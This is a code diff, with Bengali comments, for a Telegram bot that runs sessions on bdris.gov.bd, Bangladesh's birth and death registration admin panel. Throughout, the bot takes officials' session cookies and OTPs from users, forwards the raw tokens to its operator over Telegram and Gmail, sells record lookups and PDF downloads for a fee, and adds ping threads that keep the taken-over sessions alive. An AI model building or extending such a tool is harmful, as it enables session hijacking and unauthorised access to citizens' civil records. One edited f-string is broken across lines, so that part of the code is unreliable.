@@ -23,14 +23,12 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 # ==========================================
-# ==========================================
 # ০. ইমেইল সেন্ডার ও টেলিগ্রাম নোটিফিকেশন ফাংশন
 # ==========================================
 def send_email_to_admin(subject, body):
     if not ADMIN_EMAIL or not EMAIL_PASS:
         logging.warning("⚠️ Email credentials missing in Environment Variables, skipping email.")
         return
-    
     try:
         msg = MIMEMultipart()
         msg['From'] = ADMIN_EMAIL
@@ -38,52 +36,35 @@ def send_email_to_admin(subject, body):
         msg['Subject'] = subject
         msg.attach(MIMEText(body, 'plain', 'utf-8'))
         
-        # যেহেতু Render-এ পোর্ট 465 কাজ করেছে, তাই কোনো timeout ছাড়া এটিই ব্যবহার করুন
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
             server.login(ADMIN_EMAIL, EMAIL_PASS)
             server.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
             
         logging.info("✅ জিমেইলে সফলভাবে ইমেইল পাঠানো হয়েছে!")
     except Exception as e:
-        # এরর হলে কনসোলে পরিষ্কার দেখা যাবে
         logging.error(f"❌ Email Sending Failed: {e}")
 
 def relay_info_to_email(chat_id, u_name):
     u_sess = get_session(chat_id)
-    
-    # ফুল সেশন ডাটা (কোনো কাটছাঁট ছাড়া)
     ch_raw = u_sess['temp_data'].get('ch_raw', 'N/A')
     sec_raw = u_sess['temp_data'].get('sec_raw', 'N/A')
     otp_val = u_sess.get('ch_otp', 'N/A')
     
-    # জিমেইলের জন্য রিপোর্ট (Plain Text)
     email_report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
-    email_report += f"CH RAW: {ch_raw}\n\n"
-    email_report += f"OTP: {otp_val}\n\n"
-    email_report += f"SEC RAW: {sec_raw}\n"
+    email_report += f"CH RAW: {ch_raw}\n\nOTP: {otp_val}\n\nSEC RAW: {sec_raw}\n"
     
-    # টেলিগ্রামের জন্য রিপোর্ট (Markdown)
     tg_report = f"🚨 *BDRIS LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n\n🔑 *CH RAW:* `{ch_raw}`\n\n🔢 *OTP:* `{otp_val}`\n\n🔑 *SEC RAW:* `{sec_raw}`"
     
-    # ১. প্রথমে টেলিগ্রামে পাঠাবে
     safe_send(ADMIN_ID, tg_report, parse_mode="Markdown")
-    
-    # ২. এরপর জিমেইলেও পাঠাবে
     send_email_to_admin(f"Login Alert: {u_name}", email_report)
 
 def relay_admin_login_to_email(chat_id, u_name, raw_data):
-    # জিমেইলের জন্য রিপোর্ট
-    email_report = f"--- ADMIN LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
-    email_report += f"ADMIN RAW SESSION: {raw_data}\n"
-    
-    # টেলিগ্রামের জন্য রিপোর্ট
+    email_report = f"--- ADMIN LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\nADMIN RAW SESSION: {raw_data}\n"
     tg_report = f"🚨 *ADMIN LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n\n🔑 *ADMIN RAW:* `{raw_data}`"
     
-    # ১. টেলিগ্রামে পাঠাবে
     safe_send(ADMIN_ID, tg_report, parse_mode="Markdown")
-    
-    # ২. জিমেইলে পাঠাবে
     send_email_to_admin(f"Admin Login Alert: {u_name}", email_report)
+
 # ==========================================
 # ১. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
 # ==========================================
@@ -92,6 +73,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 session_lock = RLock()
 download_lock = threading.Lock()
 active_downloads = set()
+active_ping_workers = {} # 📌 সেশন পিং ট্র্যাকার (Smart Keep-Alive)
 
 _COOKIE_RE = re.compile(r'SESSION\s*[:=]?\s*([A-Za-z0-9_-]+)', re.I)
 _TS_RE = re.compile(r'TS0108b707\s*[:=]?\s*([A-Za-z0-9_-]+)', re.I)
@@ -103,17 +85,14 @@ DEFAULT_PERMS = {"apps": True, "corr": True, "repr": True, "search": True, "ubrn
 SERVICE_COSTS = {"pdf": 25, "pay": 25, "server_pdf_login": 25, "server_pdf_no_login": 50}
 
 MAX_CACHE_SIZE = 300
-SESSION_TIMEOUT = 3600
 RATE_LIMIT_INTERVAL = 0.8
 RATE_LIMIT_WARNING_INTERVAL = 5
-ID_CACHE_LIMIT = 15
-HTTP_TIMEOUT = 30
-KEEPALIVE_INTERVAL = 120  # ২ মিনিট পর পর Keep-Alive রিকোয়েস্ট যাবে
 APP_DEFAULT_LENGTH = 5
 MAX_MESSAGE_LENGTH = 4000
 MAX_SEARCH_RESULTS = 10
 MAX_RECHARGE_AMOUNT = 50000
 MIN_RECHARGE_AMOUNT = 1
+HTTP_TIMEOUT = 30
 
 # ==========================================
 # ২. কনফিগারেশন ও ডাটাবেস
@@ -209,13 +188,10 @@ def check_user_access(user_id, user_name):
                 "chat_id": user_id, "name": str(user_name)[:100], "status": "allowed", 
                 "permissions": DEFAULT_PERMS.copy(), "balance": 0
             })
-            safe_name = sanitize_name(user_name)
-            safe_send(ADMIN_ID, f"🔔 *নতুন ইউজার!*\n👤 {safe_name}\n🆔 `{user_id}`", parse_mode="Markdown")
+            safe_send(ADMIN_ID, f"🔔 *নতুন ইউজার!*\n👤 {sanitize_name(user_name)}\n🆔 `{user_id}`", parse_mode="Markdown")
             return True
         return user_record.get("status") == "allowed"
-    except Exception as e:
-        logging.error(f"Access Check Error: {e}")
-        return False
+    except: return False
 
 def get_user_permissions(user_id):
     if user_id == ADMIN_ID: return {k: True for k in DEFAULT_PERMS}
@@ -228,19 +204,96 @@ def get_user_permissions(user_id):
     except: pass
     return DEFAULT_PERMS.copy()
 
+def is_rate_limited(user_id):
+    u_sess = get_session(user_id)
+    now = time.time()
+    trigger_warning = False
+    is_limited = False
+    with session_lock:
+        if now - u_sess.get("last_action_time", now) < RATE_LIMIT_INTERVAL:
+            is_limited = True
+            if now - u_sess.get("last_warning_time", 0) > RATE_LIMIT_WARNING_INTERVAL:
+                u_sess["last_warning_time"] = now
+                trigger_warning = True
+        else:
+            u_sess["last_action_time"] = now
+    if trigger_warning:
+        safe_send(user_id, f"⚠️ *একটু ধীরে!* স্প্যামিং থেকে বাঁচতে {RATE_LIMIT_INTERVAL} সেকেন্ড অপেক্ষা করুন।", parse_mode="Markdown")
+    return is_limited
+
+def is_cancel(m):
+    if not m or not m.text: return False
+    t = m.text.strip()
+    if "/start" in t or "Back to Menu" in t or "Dashboard" in t:
+        bot.clear_step_handler_by_chat_id(m.chat.id)
+        safe_send(m.chat.id, "🏠 মেনুতে ফিরে আসা হলো।", reply_markup=generate_main_menu(m.chat.id, m.from_user.id))
+        return True
+    return False
+
 # ==========================================
-# ৪. সেশন ম্যানেজমেন্ট ও Keep-Alive (Robust)
+# ৪. সেশন ম্যানেজমেন্ট ও Independent Workers
 # ==========================================
 user_sessions = {}
+
+# 📌 ইউনিক হ্যাশ জেনারেটর
+def get_session_hash(session_obj):
+    cookies = session_obj.cookies.get_dict()
+    raw_str = f"{cookies.get('SESSION', '')}_{cookies.get('TS0108b707', '')}"
+    return hashlib.md5(raw_str.encode()).hexdigest()
+
+# 📌 পিং ওয়ার্কার থ্রেড
+def ping_worker(h, uid, session_obj, ua, mode):
+    interval = 180 if mode == "CHAIRMAN" else 240
+    while True:
+        time.sleep(interval) # নির্দিষ্ট সময় পরপর জাগবে
+        
+        is_alive = False
+        try:
+            headers = {'User-Agent': ua, 'Referer': 'https://bdris.gov.bd/admin/'}
+            res = session_obj.get("https://bdris.gov.bd/admin/", headers=headers, timeout=40)
+            if 'login' not in res.url.lower():
+                is_alive = True
+        except:
+            is_alive = False
+            
+        if not is_alive:
+            # সেশন ডেড হলে স্ট্যাটাস ফলস করা
+            with session_lock:
+                if uid in user_sessions:
+                    u_sess = user_sessions[uid]
+                    if mode == "CHAIRMAN": u_sess["ch_alive"] = False
+                    else: u_sess["sec_alive"] = False
+                    u_sess["is_alive"] = u_sess.get("sec_alive", False) or u_sess.get("ch_alive", False)
+                    save_session_to_db(uid, u_sess)
+            
+            # ওয়ার্কার রিমুভ ও লুপ ব্রেক
+            if h in active_ping_workers: del active_ping_workers[h]
+            logging.info(f"Session dead for UID: {uid} Mode: {mode}. Worker stopped.")
+            break 
+
+# 📌 ওয়ার্কার ম্যানেজার
+def manage_ping_worker(uid, u_sess):
+    if u_sess.get("ch_alive"):
+        h = get_session_hash(u_sess["ch_session"])
+        if h not in active_ping_workers:
+            t = Thread(target=ping_worker, args=(h, uid, u_sess["ch_session"], u_sess["ua"], "CHAIRMAN"), daemon=True)
+            t.start()
+            active_ping_workers[h] = t
+            
+    if u_sess.get("sec_alive"):
+        h = get_session_hash(u_sess["req_session"])
+        if h not in active_ping_workers:
+            t = Thread(target=ping_worker, args=(h, uid, u_sess["req_session"], u_sess["ua"], "SECRETARY"), daemon=True)
+            t.start()
+            active_ping_workers[h] = t
 
 def get_default_session_dict():
     return {
         "req_session": requests.Session(), "csrf": "", "ch_session": requests.Session(), "ch_csrf": "", "ch_otp": "",
         "mode": "SECRETARY", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "is_alive": False, "sec_alive": False, "ch_alive": False,
-        "current_page": "https://bdris.gov.bd/admin/",
-        "app_start": 0, "app_length": APP_DEFAULT_LENGTH, "sharok_no": 1, "temp_data": {}, 
-        "id_cache": OrderedDict(),
+        "current_page": "https://bdris.gov.bd/admin/", "app_start": 0, "app_length": APP_DEFAULT_LENGTH, "sharok_no": 1, 
+        "temp_data": {}, "id_cache": OrderedDict(),
         "last_action_time": time.time(), "last_warning_time": 0.0, "current_search_val": ""
     }
 
@@ -250,10 +303,8 @@ def get_session(user_id):
             return user_sessions[user_id]
     
     db_data = None
-    try:
-        db_data = sessions_collection.find_one({"chat_id": user_id})
-    except Exception as e: 
-        logging.error(f"DB Load Error: {e}")
+    try: db_data = sessions_collection.find_one({"chat_id": user_id})
+    except Exception as e: logging.error(f"DB Load Error: {e}")
 
     with session_lock:
         if user_id not in user_sessions:
@@ -268,6 +319,7 @@ def get_session(user_id):
                     "app_length": db_data.get("app_length", APP_DEFAULT_LENGTH)
                 })
             user_sessions[user_id] = u_sess
+            manage_ping_worker(user_id, u_sess) # 📌 সেশন লোড হলেই ওয়ার্কার চালু হবে
         return user_sessions[user_id]
 
 def save_session_to_db(user_id, u_sess):
@@ -287,6 +339,12 @@ def clear_user_session(user_id):
     with session_lock:
         if user_id in user_sessions:
             u_sess = user_sessions[user_id]
+            # 📌 কুকি হ্যাশ বের করে ওয়ার্কার রিমুভ করা
+            h_ch = get_session_hash(u_sess["ch_session"])
+            h_sec = get_session_hash(u_sess["req_session"])
+            if h_ch in active_ping_workers: del active_ping_workers[h_ch]
+            if h_sec in active_ping_workers: del active_ping_workers[h_sec]
+
             u_sess["req_session"].cookies.clear()
             u_sess["ch_session"].cookies.clear()
             u_sess["is_alive"] = False
@@ -296,125 +354,6 @@ def clear_user_session(user_id):
             u_sess["temp_data"].clear()
             save_session_to_db(user_id, u_sess)
 
-def keep_sessions_alive_and_cleanup():
-    while True:
-        time.sleep(KEEPALIVE_INTERVAL)
-        now = time.time()
-
-        with session_lock:
-            expired_users = [
-                uid for uid, s in user_sessions.items()
-                if not s.get("sec_alive", False) and not s.get("ch_alive", False)
-                and (now - s.get("last_action_time", now)) > SESSION_TIMEOUT
-            ]
-            
-            active_users = [
-                (uid, u_sess["ua"], u_sess["req_session"], u_sess["ch_session"],
-                 u_sess.get("sec_alive", False), u_sess.get("ch_alive", False))
-                for uid, u_sess in user_sessions.items()
-                if u_sess.get("sec_alive", False) or u_sess.get("ch_alive", False)
-            ]
-            
-            for uid in expired_users: 
-                del user_sessions[uid]
-
-        for uid in expired_users:
-            try: 
-                sessions_collection.update_one(
-                    {"chat_id": uid},
-                    {"$set": {"is_alive": False, "sec_alive": False, "ch_alive": False}}
-                )
-            except Exception: pass
-
-        for uid, ua, req_sess, ch_sess, sec_alive, ch_alive in active_users:
-            new_sec_alive = False
-            new_ch_alive = False
-            new_csrf = None
-            new_ch_csrf = None
-
-            # 📌 এখানে ফুল ব্রাউজার হেডার যুক্ত করা হলো
-            full_headers = {
-                'User-Agent': ua,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
-                'Referer': 'https://bdris.gov.bd/admin/',
-                'Connection': 'keep-alive'
-            }
-
-            if sec_alive:
-                try:
-                    res = req_sess.get("https://bdris.gov.bd/admin/", headers=full_headers, timeout=40)
-                    if 'login' not in res.url.lower():
-                        new_sec_alive = True
-                        c = _CSRF_RE.search(res.text)
-                        if c: new_csrf = c.group(1)
-                    else:
-                        logging.info(f"SEC session expired via server logout for [{uid}]")
-                except requests.exceptions.Timeout:
-                    logging.warning(f"SEC keepalive timeout (ignoring) [{uid}]")
-                    new_sec_alive = True
-                except Exception as e:
-                    logging.warning(f"SEC keepalive error [{uid}]: {e}")
-                    new_sec_alive = True
-
-            if ch_alive:
-                try:
-                    res = ch_sess.get("https://bdris.gov.bd/admin/", headers=full_headers, timeout=40)
-                    if 'login' not in res.url.lower():
-                        new_ch_alive = True
-                        c = _CSRF_RE.search(res.text)
-                        if c: new_ch_csrf = c.group(1)
-                    else:
-                        logging.info(f"CH session expired via server logout for [{uid}]")
-                except requests.exceptions.Timeout:
-                    logging.warning(f"CH keepalive timeout (ignoring) [{uid}]")
-                    new_ch_alive = True
-                except Exception as e:
-                    logging.warning(f"CH keepalive error [{uid}]: {e}")
-                    new_ch_alive = True
-
-            with session_lock:
-                if uid not in user_sessions: continue
-                if new_csrf: user_sessions[uid]["csrf"] = new_csrf
-                if new_ch_csrf: user_sessions[uid]["ch_csrf"] = new_ch_csrf
-                user_sessions[uid]["sec_alive"] = new_sec_alive
-                user_sessions[uid]["ch_alive"] = new_ch_alive
-                user_sessions[uid]["is_alive"] = new_sec_alive or new_ch_alive
-
-            try:
-                sessions_collection.update_one({"chat_id": uid}, {"$set": {
-                    "sec_alive": new_sec_alive, "ch_alive": new_ch_alive, "is_alive": new_sec_alive or new_ch_alive
-                }})
-            except Exception: pass
-
-def is_rate_limited(user_id):
-    u_sess = get_session(user_id)
-    now = time.time()
-    trigger_warning = False
-    is_limited = False
-    
-    with session_lock:
-        if now - u_sess.get("last_action_time", now) < RATE_LIMIT_INTERVAL:
-            is_limited = True
-            if now - u_sess.get("last_warning_time", 0) > RATE_LIMIT_WARNING_INTERVAL:
-                u_sess["last_warning_time"] = now
-                trigger_warning = True
-        else:
-            u_sess["last_action_time"] = now
-            
-    if trigger_warning:
-        safe_send(user_id, f"⚠️ *একটু ধীরে!* স্প্যামিং থেকে বাঁচতে {RATE_LIMIT_INTERVAL} সেকেন্ড অপেক্ষা করুন।", parse_mode="Markdown")
-        
-    return is_limited
-
-def is_cancel(m):
-    if not m or not m.text: return False
-    t = m.text.strip()
-    if "/start" in t or "Back to Menu" in t or "Dashboard" in t:
-        bot.clear_step_handler_by_chat_id(m.chat.id)
-        safe_send(m.chat.id, "🏠 মেনুতে ফিরে আসা হলো।", reply_markup=generate_main_menu(m.chat.id, m.from_user.id))
-        return True
-    return False
 # ==========================================
 # ৫. কিবোর্ড ও UI লজিক
 # ==========================================
@@ -464,7 +403,6 @@ def extract_sid_tsid(text):
     text = text.strip()
     s_match = _COOKIE_RE.search(text)
     t_match = _TS_RE.search(text) 
-    
     sid = s_match.group(1) if s_match else None
     tsid = t_match.group(1) if t_match else None
     
@@ -483,7 +421,6 @@ def get_active_session(u_sess):
         sec_ok = u_sess.get("sec_alive", False)
         ch_ok = u_sess.get("ch_alive", False)
         mode = u_sess["mode"]
-    
     if mode == "CHAIRMAN":
         if ch_ok: return (u_sess["ch_session"], u_sess["ch_csrf"])
         return (u_sess["req_session"], u_sess["csrf"])
@@ -550,13 +487,14 @@ def admin_login_logic(m):
                 _set_session_cookies(u_sess["req_session"], sid, tsid)
             
             success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
-            is_valid_login = success and html and (_CSRF_RE.search(html) or "logout" in html.lower() or "লগআউট" in html)
+            is_valid_login = success and html and ('login' not in html.lower() and _CSRF_RE.search(html))
             
             if is_valid_login:
                 with session_lock:
                     u_sess["sec_alive"] = True
                     u_sess["is_alive"] = True
                 save_session_to_db(uid, u_sess)
+                manage_ping_worker(uid, u_sess) # 📌 পিং ওয়ার্কার চালু
                 safe_send(m.chat.id, "✅ এডমিন সেশন সেট হয়েছে!", reply_markup=generate_main_menu(m.chat.id, uid))
                 
                 safe_name = sanitize_name(m.from_user.first_name)
@@ -590,6 +528,7 @@ def role_step_1(m):
             _set_session_cookies(u_sess["ch_session"], sid, tsid)
             u_sess["ch_alive"] = True
             u_sess["is_alive"] = u_sess.get("sec_alive", False) or True
+        manage_ping_worker(uid, u_sess) # 📌 চেয়ারম্যান সেশনের ওয়ার্কার চালু
         safe_send(m.chat.id, "✅ নিবন্ধক সেশন গৃহীত। এখন নিবন্ধকের OTP দিন:")
         bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_2)
     except Exception as e:
@@ -620,12 +559,22 @@ def role_step_3(m):
         sid, tsid = extract_sid_tsid(raw_text)
         if sid and tsid:
             u_sess = get_session(uid)
+            
+            # 📌 নতুন লজিক: কুকি ডুপ্লিকেট চেক
+            with session_lock:
+                ch_sid = u_sess["ch_session"].cookies.get("SESSION")
+                
+            if sid == ch_sid:
+                safe_send(m.chat.id, "❌ আপনি নিবন্ধক (Chairman) এবং অথোরাইজড ইউজার (Secretary) এর জন্য একই কুকি দিয়েছেন!\n\nদুটি আলাদা কুকি প্রয়োজন। দয়া করে *অথোরাইজড ইউজারের* নতুন কুকি দিন:", parse_mode="Markdown")
+                bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
+                return
+
             with session_lock:
                 u_sess["temp_data"]["sec_raw"] = raw_text 
                 _set_session_cookies(u_sess["req_session"], sid, tsid)
             
             success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
-            is_valid_login = success and html and (_CSRF_RE.search(html) or "logout" in html.lower() or "লগআউট" in html)
+            is_valid_login = success and html and ('login' not in html.lower() and _CSRF_RE.search(html))
             
             if is_valid_login:
                 with session_lock:
@@ -633,6 +582,7 @@ def role_step_3(m):
                     u_sess["is_alive"] = True
                 
                 save_session_to_db(uid, u_sess)
+                manage_ping_worker(uid, u_sess) # 📌 সেক্রেটারি সেশনের ওয়ার্কার চালু
                 safe_send(m.chat.id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
                 
                 safe_name = sanitize_name(m.from_user.first_name)
@@ -687,7 +637,7 @@ def admin_add_balance_step(m, target_id, trxid, admin_msg_id):
             
             update_balance(target_id, amount)
             try: recharge_logs.update_one({"_id": trxid}, {"$set": {"status": "approved"}})
-            except Exception: pass
+            except: pass
             
             safe_send(m.chat.id, f"✅ User {target_id} এর অ্যাকাউন্টে {amount}৳ যোগ হয়েছে।")
             safe_send(target_id, f"🎉 *রিচার্জ সফল!*\nযোগ হয়েছে: {amount}৳\nব্যালেন্স: {get_balance(target_id)}৳", parse_mode="Markdown")
@@ -788,7 +738,7 @@ def download_server_pdf(chat_id, session_uid, enc_id, filename):
         raise RuntimeError("Telegram API Failed")
 
 # ==========================================
-# ৯. অ্যাপ লিস্ট লজিক ও পেজিনেশন (Parse Error Fix)
+# ৯. অ্যাপ লিস্ট লজিক ও পেজিনেশন
 # ==========================================
 def handle_category_init(m, cmd):
     if cmd not in VALID_CMDS: return safe_send(m.chat.id, "❌ অজানা কমান্ড।")
@@ -1125,7 +1075,8 @@ def process_search_by_ubrn(m):
         if res and res.status_code == 200:
             try:
                 formatted_json = json.dumps(res.json(), indent=2, ensure_ascii=False)
-                msg_text = f"📊 *UBRN Result:*\n```json\n{formatted_json}\n```"
+                msg_text = f"📊 *UBRN Result:*\n```json\n{formatted_json}\n
+```"
                 safe_send(m.chat.id, msg_text, parse_mode='Markdown')
             except Exception as e: 
                 logging.error(f"UBRN Parse Error: {e}")
@@ -1273,22 +1224,33 @@ def admin_edit_field(m, target_uid, field):
             if field == "SEC":
                 s, t = extract_sid_tsid(val)
                 if s and t: 
+                    # 📌 ডুপ্লিকেট চেক
+                    if s == t_sess["ch_session"].cookies.get("SESSION"):
+                        return safe_send(m.chat.id, "❌ নিবন্ধক (CH) এবং অথোরাইজড ইউজারের (SEC) সেশন একই হতে পারবে না। আলাদা সেশন দিন।")
+                    
                     _set_session_cookies(t_sess["req_session"], s, t)
                     t_sess["sec_alive"] = True
                     t_sess["is_alive"] = True
                 else: return safe_send(m.chat.id, "❌ ভুল ফরম্যাট।")
+                
             elif field == "CH":
                 s, t = extract_sid_tsid(val)
                 if s and t: 
+                    # 📌 ডুপ্লিকেট চেক
+                    if s == t_sess["req_session"].cookies.get("SESSION"):
+                        return safe_send(m.chat.id, "❌ নিবন্ধক (CH) এবং অথোরাইজড ইউজারের (SEC) সেশন একই হতে পারবে না। আলাদা সেশন দিন।")
+                        
                     _set_session_cookies(t_sess["ch_session"], s, t)
                     t_sess["ch_alive"] = True
                     t_sess["is_alive"] = t_sess.get("sec_alive", False) or t_sess["ch_alive"]
                 else: return safe_send(m.chat.id, "❌ ভুল ফরম্যাট।")
+                
             elif field == "OTP":
                 if not val.isdigit(): return safe_send(m.chat.id, "❌ OTP শুধুমাত্র সংখ্যা।")
                 t_sess["ch_otp"] = val
 
         save_session_to_db(target_uid, t_sess)
+        manage_ping_worker(target_uid, t_sess) # 📌 ওয়ার্কার আপডেট করা
         safe_send(m.chat.id, f"✅ User {target_uid} এর {field} আপডেট হয়েছে!")
     except Exception as e:
         logging.error(f"Admin Edit Error: {e}")
@@ -1734,10 +1696,9 @@ def router(m):
 def run_flask():
     app = Flask(__name__)
     @app.route('/')
-    def home(): return "✅ BDRIS Bot is Live and Running!"
+    def home(): return "✅ BDRIS Bot is Live and Running smoothly with Independent Workers!"
     
     try:
-        # Render এর জন্য ডিফল্ট পোর্ট
         port = int(os.environ.get("PORT", 10000) or 10000)
         app.run(host='0.0.0.0', port=port, use_reloader=False, threaded=True)
     except Exception as e:
@@ -1751,7 +1712,7 @@ if __name__ == "__main__":
         time.sleep(1)
     except: pass
 
-    Thread(target=keep_sessions_alive_and_cleanup, daemon=True).start()
+    # 📌 নতুন Independent Worker সিস্টেম চালু করা হয়েছে, পুরনো ലুপ বাদ।
     Thread(target=run_flask, daemon=True).start()
     
     logging.info("✅ Polling Started...")
